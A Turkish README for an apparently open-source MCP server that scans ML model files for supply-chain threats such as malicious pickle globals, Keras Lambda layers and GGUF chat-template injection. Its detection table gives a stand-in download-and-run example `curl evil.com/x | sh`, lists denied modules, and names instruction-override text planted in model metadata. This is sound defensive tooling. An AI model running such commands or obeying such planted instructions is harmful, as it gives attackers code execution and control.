# @guardbee/mcp-model-scanner

[🇬🇧 English](README.md) | **🇹🇷 Türkçe** | [🇨🇳 中文](ZH.md) | [🇯🇵 日本語](JA.md) | [🇰🇷 한국어](KO.md) | [🇧🇷 Português](PT-BR.md) | [🇪🇸 Español](ES.md) | [🇩🇪 Deutsch](DE.md)

MCP (Model Context Protocol) sunucusu — ML model dosyalarını **tedarik zinciri** riskleri için tarar: dosyayı yükleyen kodu değil, dosyanın kendisini.

Çoğu "AI security" aracı entegrasyon kodunuza veya prompt'lara bakar. Bu paket sizin (veya bir takım arkadaşınızın, ya da bir `pip install`'ın) Hugging Face'ten, bir registry'den ya da bir S3 bucket'ından indirdiği asıl dosyaya bakar: bir `.pt`/`.pth`/`.pkl` checkpoint bir **pickle** dosyasıdır ve unpickling sadece veri deserialization'ı değildir — dosya yüklendiği an (`torch.load()`, `pickle.load()` vb.) keyfi Python kodu çalıştırabilir. Zararlı bir checkpoint, hipotetik değil, iyi belgelenmiş gerçek bir saldırı vektörüdür.

> Telemetri varsayılan olarak **kapalıdır**. `GUARDBEE_TELEMETRY=1` ile açılırsa sunucu, tool, başarı, süre ve dosya yolu gibi kısa parametre değerleri gönderilir; daha uzun metinler ve `content`, `token`, `password` gibi alanlar yer tutucuyla değiştirilir. Bkz. [`@guardbee/mcp-telemetry`](../telemetry/TR.md).

```
Claude ──► model-scanner ──► Model dosyalarınız
              │
              ├─ .pt / .pth / .ckpt   → PyTorch zip container: data.pkl çıkar, pickle'ı yürü
              ├─ .pkl / .pickle / .bin / .dill → ham pickle stream (dill gadget'ları dahil)
              ├─ .joblib / .jbl       → pickle + joblib'in araya gömdüğü dizi baytları ve iç pickle'lar
              ├─ .npy / .npz          → object dizileri (pickle'lanmış veri), NumPy kılığında pickle
              ├─ .safetensors         → header yapısı + disguised-binary kontrolü
              ├─ .h5 / .hdf5 / .keras → Keras Lambda-layer RCE (HDF5 ve Keras 3 zip)
              ├─ .onnx                → external_data path-traversal heuristic'i
              ├─ .gguf                → header/tensör sınırları, chat-template SSTI ve enjekte metin
              ├─ saved_model.pb / .pb / .pbtxt / .tflite → dosyaya ya da Python'a dokunan graph op'ları
              └─ hf://sahip/repo@rev  → bir Hugging Face reposunun tüm model dosyaları, tek commit'te
```

---

## Neden pickle bu paketin merkezinde

Pickle stream'leri küçük bir stack VM için bytecode'dur. Bir `GLOBAL`/`STACK_GLOBAL` opcode'u import edilebilir herhangi bir Python nesnesini adlandırır; hemen sonraki opcode'lar genellikle onu çağırır. Hazırlanmış bir pickle'ın bir tensor-yeniden-oluşturma fonksiyonu yerine `os.system` ya da `subprocess.Popen` adlandırmasını engelleyen hiçbir şey yok — ve `pickle.load()`/`torch.load()` bunu sorunsuzca çözüp çalıştırır. Bu, `picklescan`/`fickling`/Hugging Face'in Picklescan entegrasyonu gibi araçların da üzerine kurulduğu aynı teknik.

Bu paket Python'a shell açmak ya da regex kullanmak yerine sıfırdan bir pickle makinesi implement ediyor (protokol 0-5). Opcode stream'ini byte byte yürür, hiçbir şeyi çağırmadan stack'i ve memo'yu izler; böylece protokol 4+'ın `STACK_GLOBAL`'i, NumPy 2 pickle'larındaki gibi memo'dan geri alınan string'ler dahil, stack'te gerçekten duran modül ve isme çözülür. Ham byte'lar üzerinde bir regex hem kaçırır hem de sürekli yanlış alarm verirdi.

joblib da aynı makineye ihtiyaç duyar: `joblib.dump` her NumPy dizisinin ham baytlarını (object dizilerinde ise koca bir iç pickle'ı) dizinin `NumpyArrayWrapper`'ından hemen sonra yazar. Scanner wrapper'ın shape ve dtype'ını stack'ten okur, tam o kadar baytı atlar ve iç pickle'ları da kontrol eder.

Bulunan her `GLOBAL`/`STACK_GLOBAL`/`INST` referansı şuna göre kontrol edilir:
- bir tensor deserialization yolunda görünmesi için hiçbir meşru sebebi olmayan modüllerin **denylist**'i (`os`, `subprocess`, `socket`, `builtins.eval`, `ctypes`, …) → **critical/high** olarak raporlanır
- gerçek ML framework'lerinin fiilen referans verdiği modüllerin **allowlist**'i (`numpy`, `torch`, `sklearn`, `collections`, …) → sessizce safe, gürültü yok
- diğer her şey → **medium** olarak raporlanır ("unknown", "malicious" değil — düşük yanlış-pozitif oranı için manuel inceleme amaçlı)

PyTorch'un varsayılan zip tabanlı checkpoint formatı için scanner, ZIP central directory'sini doğrudan diskten okuyup (Zip64 desteğiyle) sadece küçük `data.pkl` metadata girişini bulup çıkarır — çok gigabayt'lık bir checkpoint'i asla tamamen belleğe yüklemez.

---

## Özellikler

- **Gerçek pickle ayrıştırma** — stack'i izleyen bir pickle makinesi; regex değil, Python subprocess çağrısı değil
- 6 risk kategorisinde (code-execution, process-execution, network, filesystem, reflection, deserialization) **44 tehlikeli-global kuralı**, dill'in code-object ve import gadget'ları dahil
- **PyTorch zip container desteği** (Zip64 dahil) — tüm checkpoint'i yüklemeden `data.pkl`'i çıkarıp tarar
- **joblib** — gömülü dizileri atlayarak dosyadaki her pickle opcode'una ulaşır, object dizilerinin iç pickle'ları dahil; zlib/gzip dump'ları açılır
- **NumPy `.npy`/`.npz`** — object dizileri (pickle olarak saklanır, `allow_pickle=True` ile yüklenir) ve NumPy uzantısıyla yeniden adlandırılmış düz pickle'lar
- **`.safetensors` yapısal doğrulama** — bozuk/sınır-dışı header'lar ve `.safetensors` uzantısıyla gizlenmiş bir pickle/zip tespiti
- **Keras Lambda-layer RCE** — `.h5`, Keras 3 `.keras` zip'leri ve SavedModel `keras_metadata.pb` içinde
- **ONNX `external_data` path-traversal heuristic'i**
- **GGUF** — header sayıları, string ve dizi uzunlukları, tensör boyutları, tipleri ve veri sınırları dosyanın kendisiyle karşılaştırılır; chat template'lerde Jinja sandbox kaçışı, gizli karakterler ve modele yönelik talimatlar aranır
- **TensorFlow** — SavedModel, frozen GraphDef (`.pb`/`.pbtxt`) ve TFLite Flex op'larından dosya okuyan/yazan, Python çağıran ya da tensörleri debug URL'ine gönderenler
- **Hugging Face repoları** — `scan_hf_repo` / `scan hf://sahip/repo@revision` revision'ı bir commit'e çözer ve tüm model dosyalarını o commit'ten tarar
- Her yerde sınırlı okuma (10MB pickle prefix, 100MB safetensors header sınırı, 50MB zip-entry sınırı, GGUF ve joblib 4MB'lık pencereyle okunur) — decompression bomb'lara karşı güvenli, büyük model dosyalarında OOM olmaz
- SARIF 2.1.0 çıktısı — CI/CD entegrasyonu (GitHub Code Scanning vb.)
- `guardbee.yml` ile config dosyası desteği
- Her format için zararlı ve zararsız fixture'larla 82 unit test, ayrıca [popüler açık modellerde yanlış-pozitif kontrolü](README.md#checked-against-public-models)

---

## Hızlı Başlangıç

### Claude Desktop / MCP Client

```json
{
  "mcpServers": {
    "guardbee-model-scanner": {
      "command": "npx",
      "args": ["-y", "@guardbee/mcp-model-scanner"]
    }
  }
}
```

### CLI (CI/CD)

```bash
npx @guardbee/mcp-model-scanner scan ./models --fail-on=high --format=sarif > results.sarif

# Sabit bir commit'teki Hugging Face model reposu (branch, tag ya da sha; gated/private repolar için HF_TOKEN)
npx @guardbee/mcp-model-scanner scan hf://openai-community/gpt2@607a30d783dfa663caf39e06633721c8d4cfcd7e
```

Repo modunda revision bir commit sha'sına çözülür ve her dosya o commit'ten okunur; sonuç sabit bir anlık görüntüyü anlatır, bulgular `hf://sahip/repo@sha/yol` gösterir. 256 MB'a kadar dosyalar tamamen indirilir. Daha büyükleri ilk 64 MB'larından, zip container'larda ayrıca son 64 MB'tan (central directory) kontrol edilir; kontrollerin okuduğu her header, pickle stream'i ve tensör tablosu bu kısımdadır.

---

## MCP Tools

| Tool | Açıklama |
|------|----------|
| `scan_file` | Tek bir model dosyasını tarar |
| `scan_directory` | Bir model dosyaları dizinini recursive tarar (SavedModel'i `saved_model.pb` üzerinden) |
| `scan_hf_repo` | Bir Hugging Face model reposunun tüm model dosyalarını sabit bir commit'te tarar |
| `list_patterns` | Tehlikeli-global kataloğunu risk kategorisine göre ve kontrol edilen TensorFlow op'larını listeler |

---

## Neyi yakalar

| Format | Kontrol | Önem | Örnek |
|---|---|---|---|
| pickle / PyTorch | `os`, `posix`, `nt`, `subprocess`, `socket`, `ctypes`, `runpy`, `pty.spawn`, `platform.popen`, `commands` referansı | critical | `os.system('curl evil.com/x \| sh')` |
| pickle / PyTorch | `builtins.eval`/`exec`/`compile`/`__import__`, `pickle.loads`, `marshal.loads` | critical | recursive/nested payload, ya da doğrudan eval |
| pickle / PyTorch | `builtins.getattr`/`open`, `shutil.*`, `importlib.*`, `requests.*`, `webbrowser.open`, `urllib*.urlopen` | high | exfiltration, SSRF, dosya okuma/yazma |
| safetensors | Header, uzunluk yerine pickle/zip imzasıyla başlıyor | critical | `.safetensors` olarak yeniden adlandırılmış bir `.pkl` |
| safetensors | Tensor `data_offsets` gerçek veri bölümünü aşıyor | high | sınır-dışı okuyan bir parser |
| safetensors | Geçersiz/aşırı büyük header uzunluğu, JSON olmayan header | high | bozuk ya da kasıtlı hazırlanmış header |
| Keras .h5/.keras/SavedModel | Model config'inde `class_name: "Lambda"` | critical | yüklemede marshalled-function RCE |
| ONNX | `..` içeren `external_data` location'ı | high | keyfi bir dosyaya path traversal |
| dill | `dill._dill._create_code`/`_create_function`/`_eval_repr` | critical | bytecode'dan kurulup yükleme sırasında çağrılan fonksiyon |
| dill | `dill._dill._import_module`/`_get_attr`/`_create_filehandle` | high | `os`'u adlandırmadan `os.system`'e ulaşmak |
| joblib | ana stream'de ya da bir object-dizisi iç pickle'ında pickle kurallarından herhangi biri | kurala göre | gerçek bir dizinin arkasına gizlenmiş payload |
| NumPy | object dtype; `.npy` uzantılı bir pickle | medium / high | `np.load(..., allow_pickle=True)` bunu unpickle eder |
| GGUF | Python iç yapılarına uzanan chat template (`__class__`, `__globals__`, …) | critical | Jinja sandbox kaçışı (CVE-2024-34359) |
| GGUF | metadata'da gizli Unicode ya da "önceki talimatları yok say" türü metin | high | her konuşmaya enjekte edilen talimat |
| GGUF | dosyayla tutarsız sayı, uzunluk, boyut ya da tensör sınırı | high | yamasız bir loader'da heap overflow |
| TensorFlow | `WriteFile` / `ReadFile` / `PyFunc` / dosya dataset'leri / `file://`'a `PrintV2` | critical–medium | sunucu makinesine dokunan bir graph |

Tam tehlikeli-global kataloğu için: `list_patterns` tool'unu çalıştırın, ya da [`src/dangerousGlobals.ts`](src/dangerousGlobals.ts)'e bakın.

0.4'te eklenen kural ID'leri ve yanlış-pozitif kontrolü yapılan açık modellerin listesi [README.md](README.md#rule-ids-added-in-04)'de. SARIF çıktısının yapısı değişmedi.

Bunlar düşük yanlış-pozitif oranı için ayarlanmış **heuristic** bulgulardır — özellikle HDF5 ve ONNX karmaşık binary/protobuf formatlar olduğu için tam yapısal parse yerine sınırlı bir metin-kalıbı taramasıyla taranıyor. Her bulgu yine de gözden geçirilmeli; temiz bir tarama resmi bir güvenlik kanıtı değildir.

---

## Yapılandırma (`guardbee.yml`)

```yaml
model-scanner:
  fail-on: high       # any | critical | high | medium | low | none
  max-files: 2000
  exclude:
    - "fixtures/"
```

---

## Kısıtlamalar (bilinçli tasarım)

- Ham (zip olmayan) bir pickle stream'inin sadece ilk 10MB'ı taranır (joblib dosyaları sonuna kadar yürünür) — bir pickle stream'inde tehlikeli global'ler instance'larından önce referans verilmek zorundadır, bu yüzden bu sınır dev legacy checkpoint'leri tamamen belleğe yüklemeye karşı makul bir trade-off.
- ZIP çıkarma sadece STORED ve DEFLATE'i destekler (varsayılan PyTorch checkpoint formatını kapsar).
- HDF5/ONNX kontrolleri sınırlı bir prefix üzerinde kalıp-tabanlıdır, tam yapısal/protobuf parse değildir.
- bz2, xz, lzma ya da lz4 ile sıkıştırılmış joblib dosyaları raporlanır, açılmaz. GGUF v1 ve big-endian GGUF dosyaları raporlanır, ayrıştırılmaz.
- TFLite kontrolleri Flex delegate op adlarına bakar; yerleşik TFLite op'ları yalnızca tensör matematiğidir.
- GGUF talimat kontrolleri yaygın enjeksiyon kalıplarını ve gizli karakterleri arar; dikkatle yazılmış bir talimat yine geçebilir. Kendi üretmediğiniz bir modelin chat template'ini okuyun.
- Bu araç **dosyayı** tarar, runtime davranışını değil — hiçbir şeyi çalıştırmaz ya da sandbox'lamaz.

---

## Geliştirme

```bash
npm run build
npm test             # 82 unit test
```

---

## Lisans

MIT — [GuardBee](https://guardbee.ai)

## Geri bildirim

Sorunuz, öneriniz ya da yanlış bir alarm mı var? [GitHub Discussions](https://github.com/GuardBee/guardbee-mcp/discussions)'ta bir konu açın veya [issue oluşturun](https://github.com/GuardBee/guardbee-mcp/issues). GuardBee işinize yaradıysa [repoya](https://github.com/GuardBee/guardbee-mcp) bir ⭐ başkalarının da bulmasına yardım eder.
